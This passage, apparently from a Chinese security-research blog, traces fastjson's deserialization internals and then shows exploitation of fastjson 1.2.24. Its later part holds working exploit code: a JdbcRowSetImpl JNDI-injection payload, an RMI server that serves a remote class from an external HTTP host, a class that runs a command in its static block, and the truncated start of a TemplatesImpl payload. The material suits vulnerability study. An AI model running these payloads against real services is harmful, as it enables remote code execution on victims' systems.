src="https://gitee.com/ling-x5/img/raw/master/image-20250320180238172.png" alt="image-20250320180238172" style="zoom:50%;" /><p>可以看到，我们仍然可以得到 javaBean 对象</p><blockquote><p>而 fastjson 同样提供了单参数的 parseObject()方法 com.alibaba.fastjson.JSON#parseObject(java.lang.String)，他其实就是对 com.alibaba.fastjson.JSON#parse(java.lang.String)方法做了一层封装，返回结果做了强转为 JSONObject 对象。</p></blockquote><img src="https://gitee.com/ling-x5/img/raw/master/image-20250320200041731.png" alt="image-20250320200041731" style="zoom:67%;" /><p>这样其实导致 com.alibaba.fastjson.JSON#parseObject(java.lang.String)在处理@type 注解时，既会调用 setter()方法，也会在 JSON.toJSON(obj)时调用 getter()方法。</p><p><strong>值得注意的是</strong></p><blockquote><p>假设一个类 <code>Person</code> 有一个字段 <code>name</code>，但没有 <code>setName()</code> 方法，只有 <code>getName()</code> 方法。 Fastjson 仍然可能将 JSON 中的 <code>&quot;name&quot;</code> 键识别为一个属性，即使它无法通过 Setter 方法设置值 (在这种情况下，如果 <code>name</code> 字段是 public 的且非 final，Fastjson 可能会尝试直接字段赋值，但这通常不是首选方式)。</p></blockquote><p>就像我们把 setName(String name)方法注释起来，而 name 字段为 private 时，运行下面这段代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.lingx5.entry.Person;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jsonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">personJson</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;name\&quot;:\&quot;lingx5\&quot;,\&quot;age\&quot;:18&#125;&quot;</span>;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">parse</span> <span class="hljs-operator">=</span> JSON.parseObject(personJson, com.lingx5.entry.Person.class);<br>        System.out.println(parse);<br>        System.out.println(<span class="hljs-string">&quot;parse的类型是：&quot;</span>+parse.getClass().getTypeName());<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> (Person) parse;<br>        System.out.println((person.getName() + <span class="hljs-string">&quot;:&quot;</span> + person.getAge()));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321085019318.png" alt="image-20250321085019318" style="zoom:50%;" /><p>看到 name 的值为 null，而当我们把 name 改为 public 时，可以看到即使没有 setter 方法，name 仍然是可以有值的。</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321084928094.png" alt="image-20250321084928094" style="zoom:50%;" /><h2 id="fastjson-源码分析"><a href="#fastjson-源码分析" class="headerlink" title="fastjson 源码分析"></a>fastjson 源码分析</h2><p>我们在 Object parse &#x3D; JSON.parse(personJson); 出打断点，跟如</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321092248672.png" alt="image-20250321092248672"></p><h3 id="parseObject-1"><a href="#parseObject-1" class="headerlink" title="parseObject"></a>parseObject</h3><p>调试我们会来到 com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)方法，先检测@type 标签，然后根据值进行类加载</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321092721528.png" alt="image-20250321092721528"></p><h3 id="TypeUtils-类加载"><a href="#TypeUtils-类加载" class="headerlink" title="TypeUtils 类加载"></a>TypeUtils 类加载</h3><p>parseObject 检测并获取获取@type 后，会调用 com.alibaba.fastjson.util.TypeUtils#loadClass 方法进行类加载</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321092953278.png" alt="image-20250321092953278"></p><p>而 com.alibaba.fastjson.util.TypeUtils#loadClass 方法，会去检测类型，做对应的类加载。数组 <code>[</code> 开头和引用 <code>L</code> 开头，<code>;</code> 结尾</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321093404006.png" alt="image-20250321093404006"></p><p><span style="color:#FF0000;"> 这其实时 fastjson 为了后续调用 asm 去加载属性值，做的处理。只是没有想到会被我们利用拿来绕过 </span></p><p>当然，我们的字段现在只是普通的类名，不会走这里，我们只是进行类加载，拿到 com.lingx5.entry.Person 类，并放入 com.alibaba.fastjson.util.TypeUtils#mappings 属性中，然后把 class 返回</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321094123481.png" alt="image-20250321094123481"></p><h3 id="getDeserializer"><a href="#getDeserializer" class="headerlink" title="getDeserializer"></a>getDeserializer</h3><p>获取 Java Bean 的反序列化器 (Deserializer)</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321094819605.png" alt="image-20250321094819605"></p><p>com.alibaba.fastjson.parser.ParserConfig#getDeserializer(java.lang.reflect.Type) 里面经过一系列的判断后，我们会来到 com.alibaba.fastjson.parser.ParserConfig#createJavaBeanDeserializer 方法去创建 Java Bean 反序列化器</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321095216360.png" alt="image-20250321095216360"></p><p>继续跟进，会调用到 com.alibaba.fastjson.util.DeserializeBeanInfo#computeSetters 封装 BeanInfo 对象</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321095441035.png" alt="image-20250321095441035"></p><p>我们跟进它，会发现他会通过反射获取我们 class com.lingx5.entry.Person 的无参构造方法和 setter 方法，当然要符合规范，我们进去看看有哪些规则</p><p>开始就是获取无参构造器，把构造方法赋值到 com.alibaba.fastjson.util.DeserializeBeanInfo#defaultConstructor 属性中</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321102403614.png" alt="image-20250321102403614"></p><p>截取一下判断方法的关键语句（注释标明作用）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 反射获取所有方法名，遍历</span><br><span class="hljs-keyword">for</span> (Method method : clazz.getMethods()) &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">ordinal</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>, serialzeFeatures = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> method.getName();<br>    <span class="hljs-comment">// 方法名长度必须 &gt;= 4</span><br>    <span class="hljs-keyword">if</span> (methodName.length() &lt; <span class="hljs-number">4</span>) &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    <span class="hljs-comment">// 非静态方法</span><br>    <span class="hljs-keyword">if</span> (Modifier.isStatic(method.getModifiers())) &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// support builder set</span><br>    <span class="hljs-comment">// 方法返回类型是 void 或者 当前类 clazz 本身</span><br>    <span class="hljs-keyword">if</span> (!(method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(clazz))) &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    <span class="hljs-comment">// 方法参数只能有一个</span><br>    <span class="hljs-keyword">if</span> (method.getParameterTypes().length != <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    <span class="hljs-comment">// 检测@JSONFiled注解</span><br>    <span class="hljs-type">JSONField</span> <span class="hljs-variable">annotation</span> <span class="hljs-operator">=</span> method.getAnnotation(JSONField.class);<br><br>    <span class="hljs-keyword">if</span> (annotation == <span class="hljs-literal">null</span>) &#123;<br>        annotation = TypeUtils.getSupperMethodAnnotation(clazz, method);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (annotation != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!annotation.deserialize()) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        ordinal = annotation.ordinal();<br>        serialzeFeatures = SerializerFeature.of(annotation.serialzeFeatures());<br><br>        <span class="hljs-keyword">if</span> (annotation.name().length() != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">propertyName</span> <span class="hljs-operator">=</span> annotation.name();<br>            beanInfo.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FieldInfo</span>(propertyName, method, <span class="hljs-literal">null</span>, clazz, type, ordinal, serialzeFeatures));<br>            TypeUtils.setAccessible(method);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 方法以 &quot;set&quot; 开头</span><br>    <span class="hljs-keyword">if</span> (!methodName.startsWith(<span class="hljs-string">&quot;set&quot;</span>)) &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br><br>    <span class="hljs-type">char</span> <span class="hljs-variable">c3</span> <span class="hljs-operator">=</span> methodName.charAt(<span class="hljs-number">3</span>);<br><br>    <span class="hljs-comment">// 检测是否符合javaBean规范，并拆解属性名称</span><br>    String propertyName;<br>    <span class="hljs-keyword">if</span> (Character.isUpperCase(c3)) &#123;<br>        <span class="hljs-keyword">if</span> (TypeUtils.compatibleWithJavaBean) &#123;<br>            propertyName = TypeUtils.decapitalize(methodName.substring(<span class="hljs-number">3</span>));<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            propertyName = Character.toLowerCase(methodName.charAt(<span class="hljs-number">3</span>)) + methodName.substring(<span class="hljs-number">4</span>);<br>        &#125;<br>        <span class="hljs-comment">// 忽略 &#x27;_&#x27;字符</span><br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c3 == <span class="hljs-string">&#x27;_&#x27;</span>) &#123;<br>        propertyName = methodName.substring(<span class="hljs-number">4</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c3 == <span class="hljs-string">&#x27;f&#x27;</span>) &#123;<br>        propertyName = methodName.substring(<span class="hljs-number">3</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (methodName.length() &gt;= <span class="hljs-number">5</span> &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="hljs-number">4</span>))) &#123;<br>        propertyName = TypeUtils.decapitalize(methodName.substring(<span class="hljs-number">3</span>));<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    <span class="hljs-comment">// 对boolean类型字段的判断</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> TypeUtils.getField(clazz, propertyName);<br>    <span class="hljs-keyword">if</span> (field == <span class="hljs-literal">null</span> &amp;&amp; method.getParameterTypes()[<span class="hljs-number">0</span>] == <span class="hljs-type">boolean</span>.class) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">isFieldName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;is&quot;</span> + Character.toUpperCase(propertyName.charAt(<span class="hljs-number">0</span>)) + propertyName.substring(<span class="hljs-number">1</span>);<br>        field = TypeUtils.getField(clazz, isFieldName);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (field != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">JSONField</span> <span class="hljs-variable">fieldAnnotation</span> <span class="hljs-operator">=</span> field.getAnnotation(JSONField.class);<br><br>        <span class="hljs-keyword">if</span> (fieldAnnotation != <span class="hljs-literal">null</span>) &#123;<br>            ordinal = fieldAnnotation.ordinal();<br>            serialzeFeatures = SerializerFeature.of(fieldAnnotation.serialzeFeatures());<br><br>            <span class="hljs-keyword">if</span> (fieldAnnotation.name().length() != <span class="hljs-number">0</span>) &#123;<br>                propertyName = fieldAnnotation.name();<br>                beanInfo.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FieldInfo</span>(propertyName, method, field, clazz, type, ordinal, serialzeFeatures));<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-comment">// 封装成Filedinfo中，并添加到beanInfo</span><br>    beanInfo.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FieldInfo</span>(propertyName, method, <span class="hljs-literal">null</span>, clazz, type, ordinal, serialzeFeatures));<br>    TypeUtils.setAccessible(method);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><p>通过上边的判断，我们可以总结出 setter 方法的一些特性</p><ul><li>方法名长度必须 &gt;&#x3D; 4</li><li>非静态方法</li><li>方法返回类型是 void 或者 当前类 clazz 本身</li><li>方法参数只能有一个</li><li>方法以 “set” 开头</li></ul><p>除此之外 fastjson 还有其他特性：</p><ul><li>匹配 getter()和 setter()方法时，<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code> 方法，会忽略 <code>_ -</code> 字符串</li><li>在序列化和反序列化 byte [] 数组时，会做 base64 的编码和解码</li></ul><p>最后把 beanInfo 返回</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321102644195.png" alt="image-20250321102644195"></p><p>com.alibaba.fastjson.parser.ParserConfig#createJavaBeanDeserializer 做了一系列判断后，利用 asmFactory 创建 JavaBeanDeserializer</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321102938817.png" alt="image-20250321102938817"></p><p>利用 asm 创建了一个 Java Bean 的反序列化器</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321103241974.png" alt="image-20250321103241974"></p><p>最后利用 classLoader 把它加载到内存，并创建实例返回</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321103508510.png" alt="image-20250321103508510"></p><h3 id="deserialze"><a href="#deserialze" class="headerlink" title="deserialze"></a>deserialze</h3><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321104247886.png" alt="image-20250321104247886"></p><p>调用 asm 创建的 Java Bean 的反序列化器，通过反射机制，创建 Person 实例。我们在 com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer 类中打断点</p><p>先调用无参构造方法，这是在创建 JavaBeanDeserializer 时调用的</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321104233480.png" alt="image-20250321104233480"></p><p>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#deserialze(com.alibaba.fastjson.parser.DefaultJSONParser, java.lang.reflect.Type, java.lang.Object, java.lang.Object) 通过 com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseField 调用 com.alibaba.fastjson.parser.deserializer.FieldDeserializer#setValue(java.lang.Object, int)，给属性赋值</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321130815412.png" alt="image-20250321130815412"></p><p>利用 setter 方法给属性赋值</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321131112544.png" alt="image-20250321131112544"></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321131227607.png" alt="image-20250321131227607"></p><h2 id="fastjson-反序列"><a href="#fastjson-反序列" class="headerlink" title="fastjson 反序列"></a>fastjson 反序列</h2><h3 id="1-2-24"><a href="#1-2-24" class="headerlink" title="1.2.24"></a>1.2.24</h3><p>经过前面的学习，我们已经理解了 fastjson 是如何运作的。对于 fastjson 反序列化攻击，比较流行的就是 TemplatesImpl 反序列化和 JdbcRowSetImpl 反序列化</p><h4 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h4><p>我们先来看 JdbcRowSetImpl </p><p>我们要利用 fastjson 构成攻击，肯定是利用 fastjson 做解析式自动调用 setter()方法的特性，我们来看 com.sun.rowset.JdbcRowSetImpl#setAutoCommit 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAutoCommit</span><span class="hljs-params">(<span class="hljs-type">boolean</span> autoCommit)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    <span class="hljs-comment">// The connection object should be there</span><br>    <span class="hljs-comment">// in order to commit the connection handle on or off.</span><br><br>    <span class="hljs-keyword">if</span>(conn != <span class="hljs-literal">null</span>) &#123;<br>        conn.setAutoCommit(autoCommit);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Coming here means the connection object is null.</span><br>        <span class="hljs-comment">// So generate a connection handle internally, since</span><br>        <span class="hljs-comment">// a JdbcRowSet is always connected to a db, it is fine</span><br>        <span class="hljs-comment">// to get a handle to the connection.</span><br><br>        <span class="hljs-comment">// Get hold of a connection handle</span><br>        <span class="hljs-comment">// and change the autcommit as passesd.</span><br>        conn = connect();<br><br>        <span class="hljs-comment">// After setting the below the conn.getAutoCommit()</span><br>        <span class="hljs-comment">// should return the same value.</span><br>        conn.setAutoCommit(autoCommit);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>看到当 conn 为 null 时，会去调用 connect()方法，我们进入看一下这个 connect()方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321140554584.png" alt="image-20250321140554584"></p><p>这不就像极了我们 JNDI 注入的方式，接下来只需要 getDataSourceName()满足可空，就可以利用了</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321141902833.png" alt="image-20250321141902833" style="zoom:67%;" /><p>看到 dataSource 有对应的 setter()方法，我们所有在对应 JDK 版本的 JNDI 注入漏洞都能打了</p><p>我这里用的 jdk7，还没有对 JNDI 注入做防御</p><p><strong>JdbcRowSetImplEXP</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.exp;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JdbcRowSetImplEXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;dataSource\&quot;:\&quot;rmi://localhost:1099/Exploit\&quot;,&quot;</span> +<br>                <span class="hljs-comment">// 调用 setAutoCommit 方法，触发攻击链</span><br>                <span class="hljs-string">&quot;\&quot;autoCommit\&quot;:true&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        <span class="hljs-comment">// 模拟受害的fastjson服务器</span><br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>RMIServer</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 创建JNDI引用</span><br>            <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;Exploit&quot;</span>, <span class="hljs-string">&quot;Exploit&quot;</span>, <span class="hljs-string">&quot;http://lingx5.dns.army:8000/&quot;</span>);<br>            <span class="hljs-comment">// 封装Reference对象</span><br>            <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">refWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(ref);<br>            <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>            registry.bind(<span class="hljs-string">&quot;Exploit&quot;</span>,refWrapper);<br>            System.out.println(<span class="hljs-string">&quot;RMI registry started at 1099.&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Exploit</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>还是一样，这个文件头是不能有 package 字段的，否则 JNDI 服务器加载不了这个类，也就无法复现成功</p><p>编译成 Class 的 jdk 版本要与运行版本一致，还有解释自己本例的 Exploit 的要删掉。因为 JNDI 会先去加载自己本地的类，本地没有才会去加载远程服务器的类</p></blockquote><p>开启远程的 http 服务</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321145158177.png" alt="image-20250321145158177"></p><p>执行</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321145102242.png" alt="image-20250321145102242"></p><h4 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a><strong>TemplatesImpl</strong></h4><p>这个类产生漏洞原因就是它拥有类加载的能力，并且调用了 newInstants()将定义的类实例化了。这会执行恶意类的 static 静态代码块</p><p>我们在结构的属性中可以看到这个类有 getter 和 setter 方法的属性</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321160154032.png" alt="image-20250321160154032" style="zoom:67%;" /><p>这里我们来到 getOutputProperties()方法，他会去调用 newTransformer()</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321160313509.png" alt="image-20250321160313509"></p><p>而 newTransformer()会调用 getTransletInstance()方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321160418189.png" alt="image-20250321160418189"></p><p>getTransletInstance()里有定义类的方法 defineTransletClasses()和实例化的方法 newInstance()</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321160742898.png" alt="image-20250321160742898"></p><p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#defineTransletClasses 的关键代码有：</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321191416487.png" alt="image-20250321191416487"></p><p>看到 <code>_class[i]</code> 其实就是 <code>_bytecodes[i]</code> 定义的类，我们可以给 <code>_bytecodes[i]</code> 传递恶意类的字节码，</p><p>基本的链条就有了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">getOutputProperties<br>    newTransformer<br>    getTransletInstance<br>    defineTransletClasses<br>    evil.class.newInstance<br></code></pre></td></tr></table></figure><p>当让为了让链条成立，我们还需要躲避一些 if 判断，使得 <code>_name</code> 和 <code>_factory</code> 不为空</p><p>构造 payload</p><p><strong>TemplatesImplEXP</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.exp;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TemplatesImplEXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span 